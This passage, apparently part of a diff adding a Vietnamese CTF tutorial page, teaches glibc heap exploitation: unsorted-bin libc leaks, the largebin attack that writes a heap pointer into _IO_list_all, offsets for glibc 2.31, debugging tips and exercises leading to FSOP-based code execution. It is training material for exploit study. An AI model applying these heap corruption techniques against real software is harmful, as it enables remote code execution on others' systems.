+<span class="c"># largebin: m.edit bk_nextsize = LIBC.sym._IO_list_all - 0x20 ; trigger</span>
+ia()</code></pre>
+<div class="note"><span class="tag">pwnld</span><code>rebase_libc</code> trừ offset; <code>Menu</code> gói tương tác. Phần nhận biết bin &amp; nextsize là kiến thức bài này.</div>
+  </div>
+ </div>
+</section>
+
+<!-- 08 Công cụ -->
+<section class="block" id="s8">
+ <div class="wrap">
+  <div class="secnum">08 / CÔNG CỤ</div>
+  <h2>Hộp đồ nghề</h2>
+  <div class="grid">
+    <div class="card"><div class="term">pwndbg bins/largebins</div><h4>Xem bin đôi</h4><p>fd/bk/nextsize, phát hiện corrupt.</p></div>
+    <div class="card"><div class="term">watch</div><h4>Bắt ghi largebin</h4><p>Dừng đúng lúc glibc ghi &amp;chunk2.</p></div>
+    <div class="card"><div class="term">how2heap</div><h4>POC</h4><p><code>large_bin_attack</code>, <code>unsorted_bin_attack</code>.</p></div>
+    <div class="card"><div class="term">libc source</div><h4>Đọc _int_malloc</h4><p>Đoạn chèn largebin &amp; nextsize.</p></div>
+  </div>
+ </div>
+</section>
+
+<!-- 09 Gỡ lỗi -->
+<section class="block" id="s9">
+ <div class="wrap">
+  <div class="secnum">09 / GỠ LỖI</div>
+  <h2>Khi không leak/ghi được</h2>
+  <div class="grid">
+    <div class="card"><h4>Gộp vào top</h4><p>Quên chunk chặn → chunk free gộp top, không vào unsorted.</p></div>
+    <div class="card"><h4>tcache nuốt</h4><p>Size ≤0x410 chưa làm đầy tcache → không vào unsorted.</p></div>
+    <div class="card"><h4>Leak sai offset</h4><p>Vị trí trong bin đổi fd/bk. 2.31 = −0x1ecbe0; version khác tính lại.</p></div>
+    <div class="card"><h4>largebin size sai thứ tự</h4><p>chunk1 phải LỚN hơn chunk2 (cùng index). Sai → không trigger ghi.</p></div>
+    <div class="card"><h4>largebin_corrupted abort</h4><p>glibc ≥2.30 check nextsize. Dựng đúng cả fd_nextsize (không để rác).</p></div>
+    <div class="card"><h4>chunk1 chưa vào largebin</h4><p>Quên bước "alloc chunk lớn hơn để ép duyệt unsorted". Kiểm bằng <code>largebins</code>.</p></div>
+  </div>
+ </div>
+</section>
+
+<!-- 10 Biến thể -->
+<section class="block" id="s10">
+ <div class="wrap">
+  <div class="secnum">10 / BIẾN THỂ & NHẬN DIỆN</div>
+  <h2>Chọn kỹ thuật theo size</h2>
+  <div class="tablewrap"><table>
+    <thead><tr><th>Cần</th><th>Chunk</th><th>Kỹ thuật</th></tr></thead>
+    <tbody>
+      <tr><td>Leak libc</td><td>&gt;0x410 (hoặc tcache đầy)</td><td><b>Unsorted leak</b> (−0x1ecbe0 @2.31)</td></tr>
+      <tr><td>Ghi 1 con trỏ heap vào đích</td><td>largebin (≥0x400)</td><td><b>Largebin attack</b> → <a href="fsop.html">FSOP</a></td></tr>
+      <tr><td>Ghi địa chỉ tùy ý (chunk ≤0x410)</td><td>tcache/fast</td><td><a href="tcache_fastbin.html">poisoning</a></td></tr>
+      <tr><td>Có ghi tùy ý, cần RCE</td><td>—</td><td><a href="fsop.html">FSOP</a>/<a href="house_of_apple2.html">apple2</a>/<a href="exit_handlers.html">exit</a></td></tr>
+    </tbody>
+  </table></div>
+  <div class="note"><span class="tag">Biến thể glibc</span>Unsorted bin attack cổ điển (ghi <code>main_arena</code> vào <code>global_max_fast</code>) đã bị siết ở glibc mới (≥2.29 kiểm <code>bk</code>); largebin attack còn dùng tốt tới 2.3x vì ghi con trỏ heap do ta chọn. Offset <code>_IO_list_all</code>/leak đổi theo version — tính bằng gdb.</div>
+ </div>
+</section>
+
+<!-- 11 -->
+<section class="block" id="s11">
+ <div class="wrap">
+  <div class="secnum">11 / LUYỆN TẬP</div>
+  <h2>Bài tập tăng dần</h2>
+  <div class="ex"><div class="level">⭐⭐ · Unsorted leak</div><p>Leak libc từ chunk 0x500 (có chunk chặn). Xác nhận base bằng <code>vmmap</code>, kiểm −0x1ecbe0.</p></div>
+  <div class="ex"><div class="level">⭐⭐⭐ · tcache-đầy leak</div><p>Đề giới hạn size 0x90: free 7 chunk làm đầy tcache, chunk 8 vào unsorted → leak.</p></div>
+  <div class="ex"><div class="level">⭐⭐⭐⭐⭐ · Largebin → FSOP</div><p>Dùng largebin attack ghi &amp;fake_FILE vào <code>_IO_list_all</code>, rồi trigger <a href="fsop.html">FSOP</a> để RCE.</p></div>
+ </div>
+</section>
+
+<!-- 12 -->
+<section class="block" id="s12">
+ <div class="wrap">
+  <div class="secnum">12 / THUẬT NGỮ & ĐỌC THÊM</div>
+  <h2>Tra cứu nhanh</h2>
+  <div class="grid">
+    <div class="card"><div class="term">unsorted bin</div><p>Hàng chờ chunk free lớn trước phân loại.</p></div>
+    <div class="card"><div class="term">main_arena</div><p>Struct arena trong libc; nguồn leak (+0x60).</p></div>
+    <div class="card"><div class="term">largebin</div><p>Bin cho chunk ≥0x400.</p></div>
+    <div class="card"><div class="term">fd_nextsize/bk_nextsize</div><p>Con trỏ nối chunk khác size (+0x20/+0x28).</p></div>
+    <div class="card"><div class="term">largebin attack</div><p>Ghi &amp;victim (heap) vào target.</p></div>
+    <div class="card"><div class="term">_IO_list_all</div><p>Đích hay dùng → FSOP.</p></div>
+    <div class="card"><div class="term">chunk chặn</div><p>Chunk nhỏ tránh gộp top.</p></div>
+    <div class="card"><div class="term">consolidate</div><p>Gộp chunk free kề nhau.</p></div>
+  </div>
+  <h3>Đọc thêm</h3>
+  <ul>
+    <li>Trước: <a href="tcache_fastbin.html">tcache_fastbin</a>. Tiếp: <a href="fsop.html">fsop</a> · <a href="house_of_apple2.html">house_of_apple2</a> · <a href="hook_overwrite.html">hook_overwrite</a>.</li>
+    <li>how2heap: <code>unsorted_bin_attack</code>, <code>large_bin_attack</code> · glibc <code>_int_malloc</code> (đoạn largebin insert).</li>
+  </ul>
+ </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <p><strong>Phase 4 · Bài 21.</strong> Unsorted = leak libc (fd/bk → main_arena+0x60 = libc+0x1ecbe0 @2.31). Largebin attack = ghi một con trỏ heap vào đích tùy ý (bàn đạp FSOP). Dùng khi chunk vượt tcache/fastbin. Tiếp theo: FSOP & house of apple2.</p>
+    <p style="margin-top:6px;opacity:.7">Chỉ dùng cho học tập và CTF hợp pháp.</p>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var btn=document.getElementById("themeBtn");
+  function cur(){var a=document.documentElement.getAttribute("data-theme");if(a)return a;return window.matchMedia("(prefers-color-scheme:dark)").matches?"dark":"light";}
+  btn.addEventListener("click",function(){var n=cur()==="dark"?"light":"dark";document.documentElement.setAttribute("data-theme",n);try{localStorage.setItem("ulb-theme",n);}catch(e){}});
+  try{var s=localStorage.getItem("ulb-theme");if(s)document.documentElement.setAttribute("data-theme",s);}catch(e){}
+
+  var scenes=[
+    {h:"free chunk 0x500 (+ chunk chặn)",b:"Chunk 0x500 > 0x410 → KHÔNG vào tcache. Có chunk chặn nên không gộp top → vào <b>unsorted</b>. fd=bk=libc+0x1ecbe0 → <span style=\"color:var(--ok);font-weight:700\">LEAK LIBC</span> (show chunk)."},
+    {h:"free chunk 0x40 (×1)",b:"Size 0x40 ≤ 0x410 → vào <b>tcache[0x40]</b>. fd = NULL (chunk duy nhất) hoặc (addr>>12) nếu safe-linking → leak HEAP, KHÔNG phải libc."},
+    {h:"free 8× chunk 0x40",b:"7 chunk đầu làm <b>đầy tcache[0x40]</b>. Chunk thứ 8 không còn chỗ → vào <b>unsorted</b>. Giờ chunk unsorted cho <span style=\"color:var(--ok);font-weight:700\">LEAK LIBC</span>."},
+    {h:"largebin: 0x430 rồi 0x420",b:"0x430 vào unsorted → bị đẩy vào <b>largebin</b> khi alloc chunk lớn hơn. Sửa bk_nextsize = _IO_list_all−0x20. Free 0x420 (nhỏ hơn, cùng index) → chèn largebin → glibc ghi <span style=\"color:var(--accent);font-weight:700\">*(_IO_list_all)=&amp;chunk_0x420</span>. Đây là LARGEBIN ATTACK."}
+  ];
+  var pick=document.getElementById("pick"),stage=document.getElementById("stage");
+  function show(i){var s=scenes[i];stage.innerHTML="<h4>"+s.h+"</h4><p style='margin:0'>"+s.b+"</p>";
+    [].forEach.call(pick.children,function(b,j){b.classList.toggle("active",j===i);});}
+  pick.addEventListener("click",function(e){var s=e.target.getAttribute("data-s");if(s!==null)show(+s);});
+  show(0);
+
+  var tabs=[].slice.call(document.querySelectorAll("#tabs .tab"));
+  var panels={a:document.getElementById("panel-a"),b:document.getElementById("panel-b"),c:document.getElementById("panel-c")};
+  tabs.forEach(function(t){t.addEventListener("click",function(){
+    tabs.forEach(function(x){x.classList.remove("active");});t.classList.add("active");
+    Object.keys(panels).forEach(function(k){panels[k].hidden=(k!==t.getAttribute("data-t"));});
+  });});
+})();
+</script>
